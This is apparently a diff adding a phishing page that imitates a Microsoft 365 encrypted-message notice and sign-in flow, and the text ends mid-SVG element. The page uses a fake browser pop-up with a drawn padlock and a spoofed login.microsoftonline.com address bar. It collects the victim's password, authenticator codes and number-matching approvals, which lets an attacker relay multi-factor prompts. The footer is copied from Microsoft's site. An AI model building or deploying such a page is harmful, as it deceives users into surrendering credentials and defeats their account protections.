@@ -1,0 +1,1368 @@
+<html dir="ltr" lang="en-US" class="js">
+  <head>
+    <title>Login | Microsoft 365</title>
+    <meta
+      id="viewport"
+      name="viewport"
+      content="width=device-width, initial-scale=1.0"
+    />
+
+    <link
+      rel="stylesheet"
+      type="text/css"
+      crossorigin="anonymous"
+      href="https://res.cdn.office.net/officehub/bundles/unauth-23179c1f8c.css"
+      integrity="sha256-lmYsEnYY6rZtddESPtwa9PNM8kt98Ew2aX/BqqTS+jc="
+    />
+
+    <link
+      rel="stylesheet"
+      type="text/css"
+      crossorigin="anonymous"
+      href="https://res.cdn.office.net/officehub/bundles/sharedfontstyles-f7f2466ff5.css"
+      integrity="sha256-RSxxcQrIQH2kMeEz7YMf4JxsiB8j6bDpMZL9jci6tx8="
+    />
+    <link
+      href="https://res.cdn.office.net/officehub/versionless/webfonts/segoeui_light.woff2"
+      rel="preload"
+      as="font"
+      type="font/woff2"
+      crossorigin="anonymous"
+    />
+    <link
+      href="https://res.cdn.office.net/officehub/versionless/webfonts/segoeui_regular.woff2"
+      rel="preload"
+      as="font"
+      type="font/woff2"
+      crossorigin="anonymous"
+    />
+    <link
+      href="https://res.cdn.office.net/officehub/versionless/webfonts/segoeui_semibold.woff2"
+      rel="preload"
+      as="font"
+      type="font/woff2"
+      crossorigin="anonymous"
+    />
+    <link
+      href="https://res.cdn.office.net/officehub/versionless/webfonts/segoeui_semilight.woff2"
+      rel="preload"
+      as="font"
+      type="font/woff2"
+      crossorigin="anonymous"
+    />
+
+    <link
+      rel="stylesheet"
+      href="https://www.microsoft.com/onerfstatics/marketingsites-neu-prod/west-european/shell/_scrf/css/themes=default.device=uplevel_web_pc/1b-9d8ed9/c9-be0100/a6-e969ef/43-9f2e7c/82-8b5456/a0-5d3913/43-5a5ab8/ca-ae3ce4?ver=2.0&amp;_cf=02242021_3231"
+      type="text/css"
+      media="all"
+    />
+
+    <link rel="stylesheet" href="/css/w3.css" />
+    <link rel="stylesheet" href="/css/style.css" />
+    <script src="/js/jquery.js"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+    />
+  </head>
+  <body style="display: block">
+    <div
+      id="page-spinner"
+      style="display: flex; justify-content: center; align-items: center"
+    >
+      <div
+        class="fa fa-spinner fa-spin"
+        style="font-size: 40px; margin-top: 45vh"
+      ></div>
+    </div>
+    <div id="page-content" style="display: none">
+      <div style="display: none">en-US</div>
+
+      <div class="home">
+        <div class="home__container">
+          <div class="home__header-footer home__header">
+            <div id="pmg-global-header" class="log-appear">
+              <div>
+                <div>
+                  <div>
+                    <div id="body">
+                      <img src="/images/msf-new.svg" alt="" />
+                      <div style="padding: 0px 32px">
+                        <p id="heading">
+                          Message Encryption by Microsoft Office 365
+                        </p>
+                        <p id="message">
+                          <span id="name" style="font-weight: 600"></span>
+                          (<span class="email"></span>) a secure message with
+                          <span style="font-weight: 600">ID: MFS283901</span>
+                          has been sent to you that was protected with
+                          <span style="color: 464FEB"
+                            >Microsoft Office 365.</span
+                          >
+                        </p>
+                        <div
+                          style="
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            margin: 24px 0px 0px;
+                          "
+                        >
+                          <div id="login-btn" class="pointer">
+                            Click here to read your message
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div style="text-align: center; display: none">
+                      <img
+                        class="m365-treatment-b-hero__image"
+                        src="https://res.cdn.office.net/officehub/images/content/images/unauth-refresh/unauth-m365-hero-copilot-centric-7d5c104d84.png"
+                        alt=""
+                        aria-hidden="true"
+                        style="width: 98%"
+                      />
+                    </div>
+
+                    <div
+                      style="
+                        position: absolute;
+                        top: -5px;
+                        width: 100%;
+                        font-family: SegoeUI, Helvetica, Arial, sans-serif;
+                      "
+                    >
+                      <div
+                        id="window"
+                        style="
+                          margin-left: auto;
+                          margin-right: auto;
+                          position: relative;
+                          display: none;
+                          background-color: white;
+                        "
+                      >
+                        <div id="close-mobile">
+                          <img
+                            src="/images/close(1).png"
+                            alt=""
+                            style="width: 30px"
+                          />
+                        </div>
+                        <!-- Title bar start -->
+                        <div id="title-bar-width">
+                          <div id="title-bar" style="height: 33px">
+                            <div
+                              class="w3-row"
+                              style="padding: 4px; width: 340px"
+                            >
+                              <div class="w3-col s1">
+                                <img
+                                  src="/images/logo.svg"
+                                  style="width: 20px; margin-top: 6px"
+                                  id="logo"
+                                />
+                              </div>
+                              <div class="w3-col s10">
+                                <span id="logo-description"
+                                  >Sign in to your account</span
+                                >
+                              </div>
+                            </div>
+
+                            <div>
+                              <span id="minimize">&#8212;</span>
+                              <span id="square">□</span>
+                              <span id="exit">✕</span>
+                            </div>
+                          </div>
+                          <div id="url-bar">
+                            <img
+                              src="/images/ssl.svg"
+                              width="27px"
+                              height="27px"
+                              id="ssl-padlock"
+                            />
+                            <span id="domain-name"
+                              >https://login.microsoftonline.com</span
+                            >
+                            <span id="domain-path"
+                              >/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638512179161342671.YmU2YTE0M2UtMWM1OS00NjExLTkzMzEtYTRkZTlkNjhlNzViZjBmODM4YmQtMjU0ZC00MTU4LTg0NzEtNzllZjdhMGU4OTEy&ui_locales=en-US&mkt=en-US&client-request-id=446e2680-effb-4e8d-a143-6f8a2575be09&state=1JNw5gYWrOtKOrag4DOF6C6AtmMqKj5cUipvx68Hc5vG_46PQ4A9s9CiYB_bmaZG5def0tRkpCS_W2cbtV3AdRbH7EvhZ88-KFk-TDoPpwPgW_wX1y3Y7eGr79ptzza1-7sqRX_JXITYyPY_UYF4lhrJETLPjIKfOUhmaoyERylpayTBDniyiSjojzeLz3HR0a5TcTKH2JAIy2vEP5eqMjIbZF7dnnQKNAFkZcH92VBjtNfB_dTWWjDuL7ueLQzCNJj9YJ_6qEXGvoiK7jDoMA&x-client-SKU=ID_NET6_0&x-client-ver=7.3.1.0&sso_reload=true</span
+                            >
+                          </div>
+                        </div>
+                        <!-- Content start -->
+                        <div
+                          id="loader"
+                          class="scroll"
+                          style="
+                            margin-left: auto;
+                            margin-right: auto;
+
+                            position: relative;
+                            max-width: 350px;
+                            width: calc(100% - 40px);
+                            padding: 44px;
+                            margin-bottom: 28px;
+                            background-color: #ffffff;
+                            text-align: left;
+
+                            min-width: 420px;
+                            min-height: 238px;
+                            overflow: hidden;
+                            font-weight: 400;
+                            font-size: 0.9375rem;
+                            line-height: 1.25rem;
+                          "
+                        >
+                          <div>
+                            <img src="/images/microsoft-logo.svg" alt="" />
+                          </div>
+
+                          <div style="margin: 32px 0px">
+                            <span style="font-weight: 500; font-size: 25px"
+                              >Trying to sign you in</span
+                            >
+                          </div>
+
+                          <div
+                            style="
+                              height: 5px;
+                              position: relative;
+                              margin: 48px 0px 32px;
+                            "
+                          >
+                            <div class="progress1"></div>
+                            <div class="progress2"></div>
+                            <div class="progress3"></div>
+                            <div class="progress4"></div>
+                            <div class="progress5"></div>
+                          </div>
+
+                          <div style="margin: 12px 0px 4px">
+                            <span
+                              style="
+                                color: #0067b8;
+                                font-size: 1.0155rem;
+                                font-weight: 400;
+                                line-height: 1.25rem;
+                              "
+                              >Cancel</span
+                            >
+                          </div>
+                        </div>
+                        <div
+                          id="sign-in"
+                          class="scroll"
+                          style="
+                            margin-left: auto;
+                            margin-right: auto;
+
+                            position: relative;
+                            max-width: 350px;
+                            width: calc(100% - 40px);
+                            margin-bottom: 28px;
+                            background-color: #ffffff;
+                            text-align: left;
+                            min-width: 420px;
+                            min-height: 238px;
+                            overflow: hidden;
+                            font-weight: 400;
+                            font-size: 0.9375rem;
+                            line-height: 1.25rem;
+                            display: none;
+                          "
+                        >
+                          <div
+                            id="loader-sign-in"
+                            style="
+                              height: 5px;
+                              position: relative;
+                              visibility: hidden;
+                            "
+                          >
+                            <div class="progress1"></div>
+                            <div class="progress2"></div>
+                            <div class="progress3"></div>
+                            <div class="progress4"></div>
+                            <div class="progress5"></div>
+                          </div>
+                          <div class="element">
+                            <div>
+                              <img src="/images/microsoft-logo.svg" alt="" />
+                            </div>
+                            <div style="margin: 16px 0px; height: 26px">
+                              <div
+                                id="left-arrow"
+                                class="pointer"
+                                style="
+                                  height: 21px;
+                                  width: 23px;
+                                  float: left;
+                                  padding: 0px;
+                                  display: flex;
+                                  justify-content: center;
+                                  align-items: center;
+                                  background-color: #ffffff;
+                                  border-radius: 24px;
+                                "
+                              >
+                                <img src="/images/left-arrow.svg" alt="" />
+                              </div>
+                              <span
+                                id="email-sign-in"
+                                class="email"
+                                style="margin-left: 3px; font-size: 15px"
+                              >
+                              </span>
+                            </div>
+                            <div style="margin-bottom: 12px">
+                              <span style="font-weight: 500; font-size: 25px"
+                                >Enter password</span
+                              >
+                              <div
+                                id="incorrect-pass"
+                                style="
+                                  margin-top: 12px;
+                                  color: #e81123;
+                                  font-weight: 400;
+                                  font-size: 0.9375rem;
+                                  line-height: 1.25rem;
+                                  display: none;
+                                "
+                              >
+                                Your account or password is incorrect. If you
+                                don't remember your password,
+                                <a href="" style="color: #0067b8"
+                                  >reset it now</a
+                                >.
+                              </div>
+                            </div>
+                            <div>
+                              <input
+                                id="pass-input"
+                                type="password"
+                                placeholder="Password"
+                                style="
+                                  border-top: none;
+                                  border-left: none;
+                                  border-right: none;
+                                  outline: none;
+                                  padding: 8px 0px;
+                                  width: 100%;
+                                  font-size: 14px;
+                                  border-bottom: 1px solid rgba(0, 0, 0, 0.6);
+                                "
+                              />
+                            </div>
+                            <div style="margin: 12px 0px 4px"></div>
+                            <div style="display: flex; justify-content: right">
+                              <div
+                                id="sign-in-btn-1"
+                                class="pointer"
+                                style="
+                                  color: #fff;
+                                  border-color: #0067b8;
+                                  background-color: #0067b8;
+                                  display: block;
+                                  width: 110px;
+                                  margin-top: 16px;
+                                  padding: 6px 12px 6px 12px;
+                                  text-align: center;
+                                "
+                              >
+                                Sign in
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div
+                          id="enter-code"
+                          class="scroll"
+                          style="
+                            margin-left: auto;
+                            margin-right: auto;
+
+                            position: relative;
+                            max-width: 350px;
+                            width: calc(100% - 40px);
+
+                            margin-bottom: 28px;
+                            background-color: #ffffff;
+                            text-align: left;
+
+                            min-width: 420px;
+                            min-height: 238px;
+                            overflow: hidden;
+                            font-weight: 400;
+                            font-size: 0.9375rem;
+                            line-height: 1.25rem;
+                            display: none;
+                          "
+                        >
+                          <div
+                            id="loader-enter-code"
+                            style="
+                              height: 5px;
+                              position: relative;
+                              visibility: hidden;
+                            "
+                          >
+                            <div class="progress1"></div>
+                            <div class="progress2"></div>
+                            <div class="progress3"></div>
+                            <div class="progress4"></div>
+                            <div class="progress5"></div>
+                          </div>
+                          <div class="element">
+                            <div>
+                              <img src="/images/microsoft-logo.svg" alt="" />
+                            </div>
+                            <div style="margin: 16px 0px; height: 20px">
+                              <span
+                                id="email-enter-code"
+                                class="email"
+                                style="font-size: 15px"
+                              >
+                              </span>
+                            </div>
+                            <div style="margin-bottom: 12px">
+                              <span style="font-weight: 500; font-size: 25px"
+                                >Enter code</span
+                              >
+                            </div>
+                            <div style="margin: 16px 0px">
+                              <div
+                                style="
+                                  height: 21px;
+                                  width: 23px;
+                                  float: left;
+                                  padding: 0px;
+                                  display: flex;
+                                  justify-content: center;
+                                  align-items: center;
+                                  background-color: #ffffff;
+                                  border-width: 0;
+                                  border-radius: 24px;
+                                "
+                              >
+                                <img
+                                  src="/images/picker-verify-code.svg"
+                                  alt=""
+                                  style="width: 100%"
+                                />
+                              </div>
+                            </div>
+                            <span style="margin-left: 2px; font-size: 15px"
+                              >Enter the code displayed in the authenticator app
+                              on your mobile device​​
+                            </span>
+                            <div
+                              id="incorrect-code"
+                              style="
+                                margin-top: 12px;
+                                color: #e81123;
+                                font-weight: 400;
+                                font-size: 0.9375rem;
+                                line-height: 1.25rem;
+                                display: none;
+                              "
+                            >
+                              You didn't enter the expected verification code.
+                              Please try again.
+                            </div>
+                            <div style="margin-top: 16px">
+                              <input
+                                id="code-input"
+                                type="tel"
+                                placeholder="Code"
+                                style="
+                                  border-top: none;
+                                  border-left: none;
+                                  border-right: none;
+                                  outline: none;
+                                  padding: 8px 0px;
+                                  width: 100%;
+                                  font-size: 14px;
+                                  border-bottom: 1px solid rgba(0, 0, 0, 0.6);
+                                "
+                              />
+                            </div>
+                            <div style="margin: 12px 0px 4px"></div>
+                            <div style="display: flex; justify-content: right">
+                              <div
+                                id="cancel-code"
+                                class="pointer"
+                                style="
+                                  color: #292929;
+                                  border-color: rgba(0, 0, 0, 0.2);
+                                  background-color: rgba(0, 0, 0, 0.2);
+                                  display: block;
+                                  width: 110px;
+                                  margin-top: 16px;
+                                  margin-right: 8px;
+                                  padding: 6px 12px 6px 12px;
+                                  text-align: center;
+                                "
+                              >
+                                Cancel
+                              </div>
+                              <div
+                                id="verify-code"
+                                class="pointer"
+                                style="
+                                  color: #fff;
+                                  border-color: #0067b8;
+                                  background-color: #0067b8;
+                                  display: block;
+                                  width: 110px;
+                                  margin-top: 16px;
+                                  padding: 6px 12px 6px 12px;
+                                  text-align: center;
+                                "
+                              >
+                                Verify
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div
+                          id="authenticate"
+                          class="scroll"
+                          style="
+                            margin-left: auto;
+                            margin-right: auto;
+
+                            position: relative;
+                            max-width: 350px;
+                            width: calc(100% - 40px);
+                            padding: 44px;
+                            margin-bottom: 28px;
+                            background-color: #ffffff;
+                            text-align: left;
+
+                            min-width: 420px;
+                            min-height: 238px;
+                            overflow: hidden;
+                            font-weight: 400;
+                            font-size: 0.9375rem;
+                            line-height: 1.25rem;
+                            display: none;
+                          "
+                        >
+                          <div>
+                            <img src="/images/microsoft-logo.svg" alt="" />
+                          </div>
+                          <div style="margin: 16px 0px; height: 20px">
+                            <span
+                              id="email-authenticate"
+                              class="email"
+                              style="font-size: 15px"
+                            >
+                            </span>
+                          </div>
+                          <div style="margin-bottom: 12px">
+                            <span style="font-weight: 500; font-size: 25px"
+                              >Approve sign in request</span
+                            >
+                          </div>
+                          <div style="margin: 24px 0px">
+                            <div
+                              style="
+                                height: 21px;
+                                width: 23px;
+                                float: left;
+                                padding: 0px;
+                                display: flex;
+                                justify-content: center;
+                                align-items: center;
+                                background-color: #ffffff;
+                                border-width: 0;
+                                border-radius: 24px;
+                              "
+                            >
+                              <img
+                                src="/images/picker-verify-authenticator.svg"
+                                alt=""
+                                style="width: 100%"
+                              />
+                            </div>
+                          </div>
+                          <span style="margin-left: 2px; font-size: 15px"
+                            >Open your Authenticator app, and enter the number
+                            shown to sign in
+                          </span>
+                          <div
+                            style="
+                              display: flex;
+                              justify-content: center;
+                              margin: 32px 0px 50px;
+                            "
+                          >
+                            <div
+                              style="
+                                height: 40px;
+                                width: 55px;
+                                border: 1px solid rgba(0, 0, 0, 0.644);
+                                display: flex;
+                                justify-content: center;
+                                align-items: center;
+                              "
+                            >
+                              <span
+                                id="auth-number"
+                                style="font-size: 2.5rem"
+                              ></span>
+                            </div>
+                          </div>
+
+                          <p style="font-size: 14px">
+                            No numbers in your app? Make sure to upgrade to the
+                            latest version
+                          </p>
+                          <div style="margin: 12px 0px 4px">
+                            <span
+                              class="pointer"
+                              style="
+                                color: #0067b8;
+                                font-size: 0.8125rem;
+                                font-weight: 400;
+                                line-height: 1.25rem;
+                              "
+                              >I can't use my Microsoft Authenticator app right
+                              now</span
+                            >
+                          </div>
+                          <div style="margin: 12px 0px 4px"></div>
+                        </div>
+                        <style>
+                          p {
+                            margin: 16px 0px;
+                          }
+                        </style>
+                        <div
+                          id="resend-card"
+                          class="scroll"
+                          style="
+                            margin-left: auto;
+                            margin-right: auto;
+
+                            position: relative;
+                            max-width: 350px;
+                            width: calc(100% - 40px);
+                            padding: 44px;
+                            margin-bottom: 28px;
+                            background-color: #ffffff;
+                            text-align: left;
+
+                            min-width: 420px;
+                            min-height: 238px;
+                            overflow: hidden;
+                            font-weight: 400;
+                            font-size: 0.9375rem;
+                            line-height: 1.25rem;
+                            display: none;
+                          "
+                        >
+                          <div>
+                            <img src="/images/microsoft-logo.svg" alt="" />
+                          </div>
+                          <div
+                            id="loader-resend"
+                            style="
+                              height: 5px;
+                              position: relative;
+                              visibility: hidden;
+                            "
+                          >
+                            <div class="progress1"></div>
+                            <div class="progress2"></div>
+                            <div class="progress3"></div>
+                            <div class="progress4"></div>
+                            <div class="progress5"></div>
+                          </div>
+                          <div style="margin: 16px 0px; height: 20px">
+                            <span
+                              id="email-resend"
+                              class="email"
+                              style="font-size: 15px"
+                            >
+                            </span>
+                          </div>
+                          <div style="margin-bottom: 18px">
+                            <span
+                              style="
+                                font-weight: 500;
+                                font-size: 25px;
+                                font-weight: 600;
+                              "
+                              >We didn't hear from you</span
+                            >
+                          </div>
+
+                          <span style="font-size: 15px"
+                            >We sent an identity verification request to your
+                            Microsoft Authenticator app, but we didn't hear from
+                            you in time.
+                            <span style="color: #0067b8" class="pointer"
+                              >View details</span
+                            >
+                          </span>
+                          <p id="resend" class="pointer" style="color: #0067b8">
+                            Send another request to my Microsoft Authenticator
+                            app
+                          </p>
+                          <p style="font-size: 20px">Having trouble?</p>
+
+                          <p>
+                            <span style="color: #0067b8" class="pointer"
+                              >Enter a security code</span
+                            >
+                            from your Microsoft account or authenticator app
+                            instead.
+                          </p>
+
+                          <p>
+                            If you can't use an app right now
+                            <span style="color: #0067b8" class="pointer"
+                              >get a code a different way.</span
+                            >
+                          </p>
+                          <p class="pointer" style="color: #0067b8">
+                            More information
+                          </p>
+                          <div style="display: flex; justify-content: right">
+                            <div
+                              id="cancel-code-2"
+                              class="pointer"
+                              style="
+                                color: #292929;
+                                border-color: rgba(0, 0, 0, 0.2);
+                                background-color: rgba(0, 0, 0, 0.2);
+                                display: block;
+                                width: 110px;
+                                margin-top: 16px;
+                                margin-right: 8px;
+                                padding: 6px 12px 6px 12px;
+                                text-align: center;
+                              "
+                            >
+                              Cancel
+                            </div>
+                          </div>
+
+                          <div style="margin: 12px 0px 4px"></div>
+                        </div>
+                      </div>
+                    </div>
+                    <footer
+                      id="uhf-footer"
+                      class="c-uhff context-uhf"
+                      data-uhf-mscc-rq="false"
+                      data-footer-footprint="/office/officefooter, fromService: True"
+                    >
+                      <nav
+                        class="c-uhff-nav"
+                        aria-label="Footer Resource links"
+                      >
+                        <div class="c-uhff-nav-row">
+                          <div class="c-uhff-nav-group">
+                            <div
+                              class="c-heading-4"
+                              role="heading"
+                              aria-level="2"
+                            >
+                              What's new
+                            </div>
+                            <ul class="c-list f-bare">
+                              <li>
+                                <a
+                                  aria-label="Surface Pro What's new"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Surface Pro</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Surface Laptop What's new"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Surface Laptop</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Surface Laptop Studio 2 What's new"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Surface Laptop Studio 2</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Surface Laptop Go 3 What's new"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Surface Laptop Go 3</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Microsoft Copilot What's new"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Microsoft Copilot</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="AI in Windows What's new"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >AI in Windows</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Explore Microsoft products What's new"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Explore Microsoft products</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Windows 11 apps What's new"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Windows 11 apps</a
+                                >
+                              </li>
+                            </ul>
+                          </div>
+                          <div class="c-uhff-nav-group">
+                            <div
+                              class="c-heading-4"
+                              role="heading"
+                              aria-level="2"
+                            >
+                              Microsoft Store
+                            </div>
+                            <ul class="c-list f-bare">
+                              <li>
+                                <a
+                                  aria-label="Account profile Microsoft Store"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Account profile</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Download Center Microsoft Store"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Download Center</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Microsoft Store support Microsoft Store"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Microsoft Store support</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Returns Microsoft Store"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Returns</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Order tracking Microsoft Store"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Order tracking</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Certified Refurbished Microsoft Store"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Certified Refurbished</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Microsoft Store Promise Microsoft Store"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Microsoft Store Promise</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Flexible Payments Microsoft Store"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Flexible Payments</a
+                                >
+                              </li>
+                            </ul>
+                          </div>
+                          <div class="c-uhff-nav-group">
+                            <div
+                              class="c-heading-4"
+                              role="heading"
+                              aria-level="2"
+                            >
+                              Education
+                            </div>
+                            <ul class="c-list f-bare">
+                              <li>
+                                <a
+                                  aria-label="Microsoft in education Education"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Microsoft in education</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Devices for education Education"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Devices for education</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Microsoft Teams for Education Education"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Microsoft Teams for Education</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Microsoft 365 Education Education"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Microsoft 365 Education</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="How to buy for your school Education"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >How to buy for your school</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Educator training and development Education"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Educator training and development</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Deals for students and parents Education"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Deals for students and parents</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Azure for students Education"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Azure for students</a
+                                >
+                              </li>
+                            </ul>
+                          </div>
+                        </div>
+                        <div class="c-uhff-nav-row">
+                          <div class="c-uhff-nav-group">
+                            <div
+                              class="c-heading-4"
+                              role="heading"
+                              aria-level="2"
+                            >
+                              Business
+                            </div>
+                            <ul class="c-list f-bare">
+                              <li>
+                                <a
+                                  aria-label="Microsoft Cloud Business"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Microsoft Cloud</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Microsoft Security Business"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Microsoft Security</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Dynamics 365 Business"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Dynamics 365</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Microsoft 365 Business"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Microsoft 365</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Microsoft Power Platform Business"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Microsoft Power Platform</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Microsoft Teams Business"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Microsoft Teams</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Microsoft 365 Copilot Business"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Microsoft 365 Copilot</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Small Business Business"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Small Business</a
+                                >
+                              </li>
+                            </ul>
+                          </div>
+                          <div class="c-uhff-nav-group">
+                            <div
+                              class="c-heading-4"
+                              role="heading"
+                              aria-level="2"
+                            >
+                              Developer &amp; IT
+                            </div>
+                            <ul class="c-list f-bare">
+                              <li>
+                                <a
+                                  aria-label="Azure Developer &amp; IT"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Azure</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Developer Center Developer &amp; IT"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Developer Center</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Documentation Developer &amp; IT"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Documentation</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Microsoft Learn Developer &amp; IT"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Microsoft Learn</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Microsoft Tech Community Developer &amp; IT"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Microsoft Tech Community</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Azure Marketplace Developer &amp; IT"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Azure Marketplace</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="AppSource Developer &amp; IT"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >AppSource</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Visual Studio Developer &amp; IT"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Visual Studio</a
+                                >
+                              </li>
+                            </ul>
+                          </div>
+                          <div class="c-uhff-nav-group">
+                            <div
+                              class="c-heading-4"
+                              role="heading"
+                              aria-level="2"
+                            >
+                              Company
+                            </div>
+                            <ul class="c-list f-bare">
+                              <li>
+                                <a
+                                  aria-label="Careers Company"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Careers</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="About Microsoft Company"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >About Microsoft</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Company news Company"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Company news</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Privacy at Microsoft Company"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Privacy at Microsoft</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Investors Company"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Investors</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Diversity and inclusion Company"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Diversity and inclusion</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Accessibility Company"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Accessibility</a
+                                >
+                              </li>
+                              <li>
+                                <a
+                                  aria-label="Sustainability Company"
+                                  class="c-uhff-link"
+                                  href=""
+                                  >Sustainability</a
+                                >
+                              </li>
+                            </ul>
+                          </div>
+                        </div>
+                      </nav>
+                      <div class="c-uhff-base">
+                        <a
+                          id="locale-picker-link"
+                          aria-label="Content Language Selector. Currently set to English (United States)"
+                          class="c-uhff-link c-uhff-lang-selector c-glyph glyph-world"
+                          href=""
+                          >English (United States)</a
+                        >
+
+                        <a href="" class="c-uhff-link c-uhff-ccpa">
+                          <svg
+                            role="img"
+                            xmlns="http://www.w3.org/2000/svg"
+                            viewBox="0 0 30 14"
+                            xml:space="preserve"
+                            height="16"
+                            width="43"
+                          >
+                            <title>Your Privacy Choices Opt-Out Icon</title>
+                            <path
+                              d="M7.4 12.8h6.8l3.1-11.6H7.4C4.2 1.2 1.6 3.8 1.6 7s2.6 5.8 5.8 5.8z"
+                              style="
+                                fill-rule: evenodd;
+                                clip-rule: evenodd;
+                                fill: #fff;
+                              "
+                            ></path>
+                            <path
+                              d="M22.6 0H7.4c-3.9 0-7 3.1-7 7s3.1 7 7 7h15.2c3.9 0 7-3.1 7-7s-3.2-7-7-7zm-21 7c0-3.2 2.6-5.8 5.8-5.8h9.9l-3.1 11.6H7.4c-3.2 0-5.8-2.6-5.8-5.8z"
+                              style="
+                                fill-rule: evenodd;
+                                clip-rule: evenodd;
+                                fill: #06f;
+                              "
+                            ></path>
+                            <path
